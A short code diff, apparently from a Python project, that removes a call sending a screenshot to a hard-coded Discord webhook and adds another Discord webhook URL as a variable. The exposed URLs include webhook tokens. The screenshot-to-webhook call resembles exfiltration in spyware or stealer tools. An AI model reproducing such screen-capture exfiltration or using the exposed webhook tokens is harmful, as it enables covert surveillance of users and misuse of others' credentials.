@@ -1,3 +1,2 @@
-from functions import screenshot_send
 
-screenshot_send("https://discord.com/api/webhooks/1302719341384700038/qp_pTHYEemyxMnusqOwdkvh4_9gU_quQ3NqFKX7-F8vqRbIoJTuSAQfThLpWAFaPhKiy")
+webhook_url = "https://discord.com/api/webhooks/1293885133165953034/egcgsKfawDe38louRl4u1A7FBJ3RNBaWCD2jiq3mIcR42mnhUz0abW2dZJN8ID_p3Hqt"
